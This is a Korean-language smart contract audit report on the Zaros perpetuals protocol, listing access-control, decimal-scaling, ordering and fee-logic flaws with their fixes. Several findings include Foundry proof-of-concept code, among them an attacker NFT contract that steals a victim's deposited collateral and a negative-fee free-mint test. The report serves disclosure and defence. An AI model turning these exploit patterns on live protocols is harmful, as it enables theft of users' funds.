**수석 감사 (Lead Auditors)**

[Dacian](https://twitter.com/DevDacian)

**보조 감사 (Assisting Auditors)**




---

# 발견 사항 (Findings)
## 치명적 위험 (Critical Risk)


### 공격자가 모든 사용자의 `USDToken`을 소각할 수 있음

**설명:** [USDToken::burn](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/usd/USDToken.sol#L21-L24) 함수는 다음과 같은 문제가 있습니다.
* 접근 제어가 없어 누구나 호출할 수 있습니다.
* `msg.sender`를 사용하지 않고 임의의 주소 매개변수를 받습니다.

**영향:** 누구나 `USDToken::burn`을 호출하여 모든 사용자의 토큰을 소각할 수 있습니다.

**권장 완화 방법:** 두 가지 옵션이 있습니다.
1) 신뢰할 수 있는 역할만 `USDToken::burn`을 호출할 수 있도록 접근 제어를 구현합니다.
2) 사용자가 자신의 토큰만 소각할 수 있도록 임의의 주소 입력을 제거하고 `msg.sender`를 사용합니다.

**Zaros:** [819f624](https://github.com/zaros-labs/zaros-core/commit/819f624eb9fab30599bc5383191d3dcceb3c44e8) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### 공격자가 계정 NFT 토큰을 공격용 컨트랙트 주소로 업데이트하여 사용자 예치 담보를 훔칠 수 있음

**설명:** `GlobalConfigurationBranch.setTradingAccountToken`에는 [접근 제어가 없어](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/GlobalConfigurationBranch.sol#L147-L153) 공격자가 계정 NFT 토큰을 임의의 주소로 업데이트할 수 있습니다.

**영향:** 공격자는 맞춤형 공격 컨트랙트를 사용하여 사용자가 예치한 담보를 훔칠 수 있습니다.

**개념 증명 (Proof of Concept):** 새 파일 `test/integration/perpetuals/trading-account-branch/depositMargin/stealMargin.t.sol`에 다음 코드를 추가하십시오.
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

// Zaros dependencies
import { Errors } from "@zaros/utils/Errors.sol";
import { Base_Test } from "test/Base.t.sol";
import { TradingAccountBranch } from "@zaros/perpetuals/branches/TradingAccountBranch.sol";

// @audit used for attack contract
import { ERC721, ERC721Enumerable } from "@openzeppelin/token/ERC721/extensions/ERC721Enumerable.sol";
import { IPerpsEngine } from "@zaros/perpetuals/PerpsEngine.sol";

contract AttackerAccountNFT is ERC721Enumerable {
    constructor() ERC721("", "") { }

    function stealAccount(address perpsEngineAddr, uint128 tokenId) external {
        // @audit mint attacker the requested tokenId
        _mint(msg.sender, tokenId);

        // @audit call perps engine to transfer account to attacker
        IPerpsEngine perpsEngine = IPerpsEngine(perpsEngineAddr);
        perpsEngine.notifyAccountTransfer(msg.sender, tokenId);
    }
}

contract StealMargin_Integration_Test is Base_Test {
    function setUp() public override {
        Base_Test.setUp();
    }

    function test_AttackerStealsUserCollateral() external {
        // @audit naruto the victim will create an account and deposit
        uint256 amountToDeposit = 10 ether;
        deal({ token: address(usdToken), to: users.naruto, give: amountToDeposit });

        uint128 victimTradingAccountId = perpsEngine.createTradingAccount();

        // it should emit {LogDepositMargin}
        vm.expectEmit({ emitter: address(perpsEngine) });
        emit TradingAccountBranch.LogDepositMargin(
            users.naruto, victimTradingAccountId, address(usdToken), amountToDeposit
        );

        // it should transfer the amount from the sender to the trading account
        expectCallToTransferFrom(usdToken, users.naruto, address(perpsEngine), amountToDeposit);
        perpsEngine.depositMargin(victimTradingAccountId, address(usdToken), amountToDeposit);

        uint256 newMarginCollateralBalance =
            perpsEngine.getAccountMarginCollateralBalance(victimTradingAccountId, address(usdToken)).intoUint256();

        // it should increase the amount of margin collateral
        assertEq(newMarginCollateralBalance, amountToDeposit, "depositMargin");

        // @audit sasuke the attacker will steal naruto's deposit
        // beginning state: theft has not occured
        assertEq(0, usdToken.balanceOf(users.sasuke));
        //
        // @audit 1) sasuke creates their own hacked `AccountNFT` contract
        vm.startPrank(users.sasuke);
        AttackerAccountNFT attackerNftContract = new AttackerAccountNFT();

        // @audit 2) sasuke uses lack of access control to make their
        // hacked `AccountNFT` contract the official contract
        perpsEngine.setTradingAccountToken(address(attackerNftContract));

        // @audit 3) sasuke calls the attack function in their hacked `AccountNFT`
        // contract to steal ownership of the victim's account
        attackerNftContract.stealAccount(address(perpsEngine), victimTradingAccountId);

        // @audit 4) sasuke withdraws the victim's collateral
        perpsEngine.withdrawMargin(victimTradingAccountId, address(usdToken), amountToDeposit);
        vm.stopPrank();

        // @audit end state: sasuke has stolen the victim's deposited collateral
        assertEq(amountToDeposit, usdToken.balanceOf(users.sasuke));
    }
}
```

실행: `forge test --match-test test_AttackerStealsUserCollateral`

**권장 완화 방법:** `GlobalConfigurationBranch.setTradingAccountToken`에 `onlyOwner` 수정자를 추가하십시오.

**Zaros:** [819f624](https://github.com/zaros-labs/zaros-core/commit/819f624eb9fab30599bc5383191d3dcceb3c44e8) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### `TradingAccount::withdrawMarginUsd`가 18자리 미만의 소수점을 가진 토큰에 대해 잘못된 큰 금액의 마진 담보를 전송함

**설명:** `UD60x18` 값은 18자리 미만의 소수점을 가진 담보 토큰에 대해 [18자리로 확장](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/MarginCollateralConfiguration.sol#L46-L50)됩니다. 그러나 `TradingAccount::withdrawMarginUsd`가 수신자에게 토큰을 전송할 때 담보 토큰의 기본 소수점 값으로 다시 축소하지 않습니다.

```solidity
function withdrawMarginUsd(
    Data storage self,
    address collateralType,
    UD60x18 marginCollateralPriceUsdX18,
    UD60x18 amountUsdX18,
    address recipient
)
    internal
    returns (UD60x18 withdrawnMarginUsdX18, bool isMissingMargin)
{
    UD60x18 marginCollateralBalanceX18 = getMarginCollateralBalance(self, collateralType);
    UD60x18 requiredMarginInCollateralX18 = amountUsdX18.div(marginCollateralPriceUsdX18);
    if (marginCollateralBalanceX18.gte(requiredMarginInCollateralX18)) {
        withdraw(self, collateralType, requiredMarginInCollateralX18);

        withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(amountUsdX18);

        // @audit wrong amount for collateral tokens with less than 18 decimals
        // needs to be scaled down to collateral token's native precision
        IERC20(collateralType).safeTransfer(recipient, requiredMarginInCollateralX18.intoUint256());

        isMissingMargin = false;
        return (withdrawnMarginUsdX18, isMissingMargin);
    } else {
        UD60x18 marginToWithdrawUsdX18 = marginCollateralPriceUsdX18.mul(marginCollateralBalanceX18);
        withdraw(self, collateralType, marginCollateralBalanceX18);
        withdrawnMarginUsdX18 = withdrawnMarginUsdX18.add(marginToWithdrawUsdX18);

        // @audit wrong amount for collateral tokens with less than 18 decimals
        // needs to be scaled down to collateral token's native precision
        IERC20(collateralType).safeTransfer(recipient, marginCollateralBalanceX18.intoUint256());

        isMissingMargin = true;
        return (withdrawnMarginUsdX18, isMissingMargin);
    }
}
```

가능한 시나리오는 다음과 같습니다.
- 사용자가 거래 계좌에 10,000 USDC(6자리 소수점)를 입금합니다. 그러면 마진 담보 잔액은 `10000 * 10^(18 - 6) = 10^16`이 됩니다.
- 청산/정산 중에 `withdrawMarginUsd`가 `requiredMarginInCollateralX18 = 1e4`로 호출되며, 이는 `10^-8 USDC`를 의미합니다.
- 그러나 잘못된 소수점 변환 로직으로 인해 함수는 전체 담보(10,000 USDC)를 전송하지만 여전히 `10^16 - 10^4`의 담보 잔액을 가지고 있습니다.

**영향:** 마진 담보 잔액이 손상되어 사용자가 정해진 것보다 더 많은 담보를 인출할 수 있게 되어 다른 사용자가 인출할 수 없게 되어 자금 손실로 이어집니다.

**권장 완화 방법:** `withdrawMarginUsd`는 `safeTransfer`를 호출하기 전에 금액을 담보 토큰의 기본 정밀도로 축소해야 합니다.

**Zaros:** [1ac2acc](https://github.com/zaros-labs/zaros-core/commit/1ac2acc179830c08069b3e5856b9439867a06d50#diff-f09472a5f9e6d5545d840c0760cb5606febbfe8a60fa8b7fc6e7cda8735ce357R378-R396) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### `TradingAccount::activeMarketsIds`의 순서 손상으로 인해 `LiquidationBranch::liquidateAccounts`가 되돌려져 여러 활성 시장을 가진 계정을 청산할 수 없음

**설명:** `LiquidationBranch::liquidateAccounts`는 청산 중인 계정의 활성 시장을 반복하며 이 활성 시장의 순서가 일정하게 유지될 것이라고 가정합니다.
```solidity
// load open markets for account being liquidated
ctx.amountOfOpenPositions = tradingAccount.activeMarketsIds.length();

// iterate through open markets
for (uint256 j = 0; j < ctx.amountOfOpenPositions; j++) {
    // load current active market id into working data
    // @audit assumes constant ordering of active markets
    ctx.marketId = tradingAccount.activeMarketsIds.at(j).toUint128();

    PerpMarket.Data storage perpMarket = PerpMarket.load(ctx.marketId);
    Position.Data storage position = Position.load(ctx.tradingAccountId, ctx.marketId);

    ctx.oldPositionSizeX18 = sd59x18(position.size);
    ctx.liquidationSizeX18 = unary(ctx.oldPositionSizeX18);

    ctx.markPriceX18 = perpMarket.getMarkPrice(ctx.liquidationSizeX18, perpMarket.getIndexPrice());

    ctx.fundingRateX18 = perpMarket.getCurrentFundingRate();
    ctx.fundingFeePerUnitX18 = perpMarket.getNextFundingFeePerUnit(ctx.fundingRateX18, ctx.markPriceX18);

    perpMarket.updateFunding(ctx.fundingRateX18, ctx.fundingFeePerUnitX18);
    position.clear();

    // @audit this calls `EnumerableSet::remove` which changes the order of `activeMarketIds`
    tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD_ZERO);
```

그러나 `activeMarketIds`는 `EnumerableSet`으로, 요소의 순서가 [보존된다는 보장](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L16)이 없으며 [유지](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L131-L141)되지 않습니다. 또한 `remove` 함수는 성능상의 이유로 [swap-and-pop](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L89-L91) 방식을 사용하므로 활성 시장이 제거될 때 순서가 손상됨이 *보장*됩니다.

**영향:** 거래 계좌에 여러 개의 오픈 시장이 있는 경우, 청산 중에 첫 번째 오픈 시장이 닫히면 계정의 `activeMarketIds` 순서가 손상됩니다. 이로 인해 마지막 활성 시장을 제거하려고 할 때 `panic: array out-of-bounds access` 오류와 함께 청산 트랜잭션이 되돌려집니다.

따라서 여러 활성 시장을 가진 사용자를 청산하는 것은 불가능합니다. 사용자는 여러 활성 시장에 포지션을 보유함으로써 청산이 불가능하게 만들 수 있습니다.

**개념 증명 (Proof of Concept):** `test/Base.t.sol`에 다음 도우미 함수를 추가하십시오.
```solidity
function openManualPosition(
    uint128 marketId,
    bytes32 streamId,
    uint256 mockUsdPrice,
    uint128 tradingAccountId,
    int128 sizeDelta
) internal {
    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: tradingAccountId,
            marketId: marketId,
            sizeDelta: sizeDelta
        })
    );

    bytes memory mockSignedReport = getMockedSignedReport(streamId, mockUsdPrice);

    changePrank({ msgSender: marketOrderKeepers[marketId] });

    // fill first order and open position
    perpsEngine.fillMarketOrder(tradingAccountId, marketId, mockSignedReport);

    changePrank({ msgSender: users.naruto });
}
```

그런 다음 `test/integration/perpetuals/liquidation-branch/liquidateAccounts.t.sol`에 PoC 함수를 추가하십시오.
```solidity
function test_ImpossibleToLiquidateAccountWithMultipleMarkets() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto opens second position in ETH market
    openManualPosition(ETH_USD_MARKET_ID, ETH_USD_STREAM_ID, MOCK_ETH_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // make BTC position liquidatable
    updateMockPriceFeed(BTC_USD_MARKET_ID, MOCK_BTC_USD_PRICE/2);

    // make ETH position liquidatable
    updateMockPriceFeed(ETH_USD_MARKET_ID, MOCK_ETH_USD_PRICE/2);

    // verify naruto can now be liquidated
    uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
    assertEq(1, liquidatableAccountsIds.length);
    assertEq(tradingAccountId, liquidatableAccountsIds[0]);

    // attempt to liquidate naruto
    changePrank({ msgSender: liquidationKeeper });

    // this reverts with "panic: array out-of-bounds access"
    // due to the order of `activeMarketIds` being corrupted by
    // the removal of the first active market then when attempting
    // to remove the second active market it triggers this error
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);

    // comment out the ETH position above it no longer reverts since
    // then user would only have 1 active market
    //
    // comment out the following line from `LiquidationBranch::liquidateAccounts`
    // and it also won't revert since the active market removal won't happen:
    //
    // tradingAccount.updateActiveMarkets(ctx.marketId, ctx.oldPositionSizeX18, SD_ZERO);
}
```

실행: `forge test --match-test test_ImpossibleToLiquidateAccountWithMultipleMarkets`

**권장 완화 방법:** 거래 계좌의 활성 시장 ID를 저장하기 위해 순서를 보존하는 데이터 구조를 사용하십시오.

또는 `LiquidationBranch::liquidateAccounts`에서 `for` 루프 내부에서 활성 시장 ID를 제거하지 말고 루프가 완료된 후에 제거하십시오. 이렇게 하면 `for` 루프 동안 활성 시장에 대해 일관된 반복 순서가 생성됩니다.

또 다른 옵션은 `EnumerableSet::values`를 호출하여 메모리 사본을 얻고 스토리지 대신 메모리 사본을 반복하는 것입니다. 예:
```diff
- ctx.marketId = tradingAccount.activeMarketsIds.at(j).toUint128();
+ ctx.marketId = activeMarketIdsCopy[j].toUint128();
```

**Zaros:** [53a3646](https://github.com/zaros-labs/zaros-core/commit/53a3646fef8db5e7da5cbe428bbb2d167f45e8bf) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### 공격자가 음수 `makerFee`를 사용하는 시장에서 포지션을 열었다가 빠르게 닫아 무위험 거래로 무료 USDz 토큰을 발행할 수 있음

**설명:** 공격자는 음수 `makerFee`를 사용하는 시장에서 포지션을 열었다가 빠르게 닫는 방식으로 무위험 거래를 수행하여 무료 USDz 토큰을 발행할 수 있습니다. 이것은 본질적으로 무위험 "거래"로 위장한 무료 발행 악용입니다.

**개념 증명 (Proof of Concept):** 먼저 `script/markets/BtcUsd.sol`을 변경하여 다음과 같이 음수 `makerFee`를 갖도록 합니다.
```solidity
-    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: 0.0004e18, takerFee: 0.0008e18 });
+    OrderFees.Data internal btcUsdOrderFees = OrderFees.Data({ makerFee: -0.0004e18, takerFee: 0.0008e18 });
```

그런 다음 `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 PoC를 추가하십시오.
```solidity
// new import at the top
import {console} from "forge-std/console.sol";

function test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee() external {
    // In a market with a negative maker fee, an attacker can perform
    // a risk-free "trade" by opening then quickly closing a position.
    // This allows attackers to mint free USDz without
    // any risk; it is essentially a free mint exploit dressed up
    // as a risk-free "trade"

    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // naruto closes position in BTC market immediately after
    // in practice this would occur one or more blocks after the
    // first order had been filled
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, -USER_POS_SIZE_DELTA);

    // verify that now naruto has MORE USDz than they started with!
    uint256 traderCollateralBalance = perpsEngine.getAccountMarginCollateralBalance(tradingAccountId, address(usdToken)).intoUint256();
    assert(traderCollateralBalance > USER_STARTING_BALANCE);

    // naruto now withdraws all their collateral
    perpsEngine.withdrawMargin(tradingAccountId, address(usdToken), traderCollateralBalance);

    // verify that naruto has withdrawn more USDz than they deposited
    uint256 traderFinalUsdzBalance = usdToken.balanceOf(users.naruto);
    assert(traderFinalUsdzBalance > USER_STARTING_BALANCE);

    // output the profit
    console.log("Start USDz  : %s", USER_STARTING_BALANCE);
    console.log("Final USDz  : %s", traderFinalUsdzBalance);
    console.log("USDz profit : %s", traderFinalUsdzBalance - USER_STARTING_BALANCE);

    // profit = 796 040000000000000000
    //        = $796
}
```

실행: `forge test --match-test test_AttackerMintsFreeUSDzOpenThenQuicklyClosePositionMarketNegMakerFee -vvv`

**영향:** 공격자는 사실상 무위험 또는 최소 위험 거래를 수행하여 음수 `makerFee`를 통해 무료 토큰을 수확할 수 있습니다. PoC에서 공격자는 $796의 이익을 얻을 수 있었습니다.

이 공격 벡터에 대한 한 가지 잠재적인 무효화 요인은 실제 시스템에서 프로토콜이 주문을 채우는 키퍼(keepers)를 제어하므로 공격자가 실제로 두 거래를 동일한 블록에 강제할 수 없다는 것입니다.

실제 흐름은 다음과 같습니다.

1) 공격자가 매수 시장 주문 생성 (블록 1)
2) 키퍼가 매수 주문 체결 (블록 2)
3) 공격자가 매도 시장 주문 생성 (블록 3)
4) 키퍼가 매도 주문 체결 (블록 4)

따라서 실제로 한 블록에서 수행할 수 없으므로 공격자는 아주 짧은 시간 동안 시장 변동에 노출되며 플래시 론으로 악용할 수 없습니다.

그러나 공격자가 다음 2가지 낮은 위험 발견 사항을 악용하여 두 거래 모두에서 메이커 수수료를 수확할 수 있으므로, 시장 변동에 매우 적게 노출되면서 무료 토큰을 발행하는 것은 여전히 상당히 악용 가능해 보입니다.
* `PerpMarket::getOrderFeeUsd`는 전체 거래에 대해 `makerFee`로 스큐를 뒤집는 거래자에게 보상함
* `PerpMarket::getOrderFeeUsd`는 스큐가 0이고 거래가 매수 주문일 때 `makerFee`를 잘못 청구함

**권장 완화 방법:** 두 가지 가능한 옵션:
1) 음수 `makerFee` / `takerFee`를 허용하지 마십시오. `leaves/OrderFees.sol`을 `uint128`을 사용하도록 변경하십시오.
2) 음수 수수료가 필요한 경우, 공격자가 단순히 `makerFee`를 현금화하기 위해 포지션을 열었다가 빠르게 닫을 수 없도록 포지션을 수정하기 전에 열어 두어야 하는 최소 시간을 구현하십시오.

**Zaros:** [e03228e](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3) 커밋에서 음수 수수료를 더 이상 지원하지 않음으로써 수정됨; `makerFee`와 `takerFee` 모두 이제 부호 없는(unsigned) 정수입니다.

**Cyfrin:** 확인됨.

\clearpage
## 높은 위험 (High Risk)


### `TradingAccountBranch::depositMargin`이 18자리 미만의 소수점을 가진 토큰에 대해 사용자가 입금한 것보다 더 큰 금액을 전송하려고 시도함

**설명:** 18자리 미만의 소수점을 가진 담보 토큰의 경우 `TradingAccountBranch::depositMargin`은 사용자가 실제로 입금하는 것보다 더 많은 양의 토큰을 전송하려고 시도합니다.
* 입력 `amount`는 `MarginCollateralConfiguration::convertTokenAmountToUd60x18`을 통해 `ud60x18Amount`로 변환되며, 이는 [`amount`를 18자리 소수점으로 확장](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/MarginCollateralConfiguration.sol#L46-L50)합니다.
* `safeTransferFrom` 호출은 `ud60x18Amount::intoUint256`을 전달받아 확장된 입력 금액을 다시 `uint256`으로 변환합니다.

```solidity
function depositMargin(uint128 tradingAccountId, address collateralType, uint256 amount) public virtual {
    // load margin collateral config for this collateral type
    MarginCollateralConfiguration.Data storage marginCollateralConfiguration =
        MarginCollateralConfiguration.load(collateralType);

    // @audit convert uint256 -> UD60x18; scales input amount to 18 decimals
    UD60x18 ud60x18Amount = marginCollateralConfiguration.convertTokenAmountToUd60x18(amount);

    // *snip* //

    // @audit fetch tokens from the user; using the ud60x18Amount which has been
    // scaled up to 18 decimals. Will attempt to transfer more tokens than
    // user actually depositing
    IERC20(collateralType).safeTransferFrom(msg.sender, address(this), ud60x18Amount.intoUint256());
```

**영향:** 18자리 미만의 소수점을 가진 담보 토큰의 경우 `TradingAccountBranch::depositMargin`은 사용자가 실제로 입금하는 것보다 더 많은 토큰을 전송하려고 시도합니다. 사용자가 더 큰 금액(또는 무제한 승인)을 승인하지 않은 경우 트랜잭션이 되돌려집니다. 마찬가지로 사용자가 충분한 자금을 가지고 있지 않은 경우에도 되돌려집니다. 사용자가 충분한 자금을 가지고 있고 승인을 부여한 경우 사용자의 토큰은 프로토콜에 의해 도난당합니다.

**권장 완화 방법:** `safeTransferFrom`은 `ud60x18Amount` 대신 `amount`를 사용해야 합니다.

```diff
- IERC20(collateralType).safeTransferFrom(msg.sender, address(this), ud60x18Amount.intoUint256());
+ IERC20(collateralType).safeTransferFrom(msg.sender, address(this), amount);
```

**Zaros:** [3fe9c0a](https://github.com/zaros-labs/zaros-core/commit/3fe9c0a21394cbbb0fc9999dfd534e2b723cc071#diff-b7968970769299fcdbfb6ef6a99fb78342b70e422a56416e5d9c107e5a009fc3R274) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### `GlobalConfiguration::removeCollateralFromLiquidationPriority`가 담보 우선순위 순서를 손상시켜 담보 청산 순서가 올바르지 않게 됨

**설명:** `GlobalConfiguration`은 담보 청산 우선순위 순서를 저장하기 위해 OpenZeppelin의 `EnumerableSet`을 [사용](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/leaves/GlobalConfiguration.sol#L46)합니다.
```solidity
/// @param collateralLiquidationPriority The set of collateral types in order of liquidation priority
struct Data {
    /* snip....*/
    EnumerableSet.AddressSet collateralLiquidationPriority;
}
```

그러나 OpenZeppelin의 `EnumerableSet`은 요소의 순서가 [보존된다는 보장](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L16)을 명시적으로 제공하지 않으며 [유지](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L131-L141)하지 않습니다. 또한 `remove` 함수는 성능상의 이유로 [swap-and-pop](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L89-L91) 방식을 사용하므로 담보가 제거될 때 순서가 손상됨이 *보장*됩니다.

**영향:** 세트에서 담보 하나가 제거되면 담보 우선순위 순서가 손상됩니다. 이로 인해 잘못된 담보가 청산 우선순위가 지정되고 프로토콜 내의 다른 기능에 영향을 미칩니다.

**개념 증명 (Proof of Concept):** 다음의 독립형 Foundry PoC를 확인하십시오.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import { EnumerableSet } from "openzeppelin-contracts/utils/structs/EnumerableSet.sol";

import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract SetTest
contract SetTest is Test {
    using EnumerableSet for EnumerableSet.AddressSet;

    EnumerableSet.AddressSet collateralLiquidationPriority;

    function test_collateralLiquidationPriorityReorders() external {
        // create original order of collateral liquidation priority
        address collateralType1 = address(1);
        address collateralType2 = address(2);
        address collateralType3 = address(3);
        address collateralType4 = address(4);
        address collateralType5 = address(5);

        // add them to the set
        collateralLiquidationPriority.add(collateralType1);
        collateralLiquidationPriority.add(collateralType2);
        collateralLiquidationPriority.add(collateralType3);
        collateralLiquidationPriority.add(collateralType4);
        collateralLiquidationPriority.add(collateralType5);

        // affirm length and correct order
        assertEq(5, collateralLiquidationPriority.length());
        assertEq(collateralType1, collateralLiquidationPriority.at(0));
        assertEq(collateralType2, collateralLiquidationPriority.at(1));
        assertEq(collateralType3, collateralLiquidationPriority.at(2));
        assertEq(collateralType4, collateralLiquidationPriority.at(3));
        assertEq(collateralType5, collateralLiquidationPriority.at(4));

        // everything looks good, the collateral priority is 1->2->3->4->5

        // now remove the first element as we don't want it to be a valid
        // collateral anymore
        collateralLiquidationPriority.remove(collateralType1);

        // length is OK
        assertEq(4, collateralLiquidationPriority.length());

        // we now expect the order to be 2->3->4->5
        // but EnumerableSet explicitly provides no guarantees on ordering
        // and for removing elements uses the `swap-and-pop` technique
        // for performance reasons. Hence the 1st priority collateral will
        // now be the last one!
        assertEq(collateralType5, collateralLiquidationPriority.at(0));

        // the collateral priority order is now 5->2->3->4 which is wrong!
        assertEq(collateralType2, collateralLiquidationPriority.at(1));
        assertEq(collateralType3, collateralLiquidationPriority.at(2));
        assertEq(collateralType4, collateralLiquidationPriority.at(3));
    }
}
```

**권장 완화 방법:** 담보 청산 우선순위를 저장하기 위해 순서를 보존하는 데이터 구조를 사용하십시오.

대안으로 OpenZeppelin의 `EnumerableSet`을 사용할 수 있지만 `remove` 함수는 절대 호출해서는 안 됩니다. 담보를 제거할 때 전체 세트를 비우고 제거된 요소를 뺀 이전 순서로 새 세트를 구성해야 합니다.

**Zaros:** [862a3c6](https://github.com/zaros-labs/zaros-core/commit/862a3c6514248b30c803bc26b753fd9b21e20982) 커밋에서 수정됨.

**Cyfrin:** 확인됨.


### 초기 증거금 요건 미만이지만 유지 증거금 요건 이상일 때 트레이더가 오픈 포지션 크기를 줄일 수 없음

**설명:** [`OrderBranch::createMarketOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/OrderBranch.sol#L204-L208) 및 [`SettlementBranch::_fillOrder`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/perpetuals/branches/SettlementBranch.sol#L130-L139)는 트레이더가 이전에 오픈한 포지션의 크기를 줄이는 경우에도 항상 초기 증거금 요건을 시행합니다.

**영향:** 트레이더의 포지션에 마이너스 PNL이 발생하여 더 이상 초기 증거금 요건을 충족하지 못하는 경우, 트레이더는 포지션이 계속 악화되어 청산 대상이 되는 유지 증거금 요건 미만으로 떨어지기 전에 포지션 크기를 줄이고 싶어할 수 있습니다.

그러나 이 경우 트레이더가 포지션 크기를 줄이려고 시도하면 `OrderBranch::createMarketOrder` 및 `SettlementBranch::_fillOrder`가 이미 오픈된 포지션을 줄일 때에도 항상 초기 증거금 요건을 확인하므로 트랜잭션은 항상 되돌려집니다.

따라서 트레이더는 아직 청산 대상이 아닌 손실 포지션에 대한 노출을 축소할 수 없습니다.

**개념 증명 (Proof of Concept):** `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.sol`에 다음 PoC를 추가하십시오.
```solidity
function test_TraderCantReducePositionSizeWhenCollateralUnderIntitialRequired() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // market moves against Naruto's position
    // giving Naruto a negative PNL but not to the point of liquidation
    // if changed this to "/10" instead of "/11" naruto would be liquidatable,
    // so this is just on the verge of being liquidated
    uint256 updatedPrice = MOCK_BTC_USD_PRICE-MOCK_BTC_USD_PRICE/11;
    updateMockPriceFeed(BTC_USD_MARKET_ID, updatedPrice);

    // naruto's position now is below the initial margin requirement
    // but above the maintenance requirement. Naruto attempts to
    // reduce their position size to limit exposure but this reverts
    // with `InsufficientMargin` since `OrderBranch::createMarketOrder`
    // and `SettlementBranch::_fillOrder` always check against initial
    // margin requirements even when reducing already opened positions
    openManualPosition(BTC_USD_MARKET_ID,
                       BTC_USD_STREAM_ID,
                       updatedPrice,
                       tradingAccountId,
                       USER_POS_SIZE_DELTA-USER_POS_SIZE_DELTA/2);
}
```

실행: `forge test --match-test test_TraderCantReducePositionSizeWhenCollateralUnderIntitialRequired -vvv`

**권장 완화 방법:** 이미 오픈된 포지션을 수정할 때 `OrderBranch::createMarketOrder` 및 `SettlementBranch::_fillOrder`는 필수 유지 증거금을 확인해야 합니다. 청산 대상이 아닌 트레이더는 필수 초기 증거금 미만이지만 필수 유지 증거금 이상일 때 포지션 크기를 줄일 수 있어야 합니다.

**Zaros:** [22a0385](https://github.com/zaros-labs/zaros-core/commit/22a0385fca34b79d42dd6f3bc627e2335756ccc3) 커밋에서 수정됨.

**Cyfrin:** 확인됨.

\clearpage

## 중간 위험 (Medium Risk)


### `ChainlinkUtil::getPrice`가 오래된 가격(stale price)을 확인하지 않음

**설명:** [`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33)는 [오래된 가격을 확인](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#99af)하지 않습니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

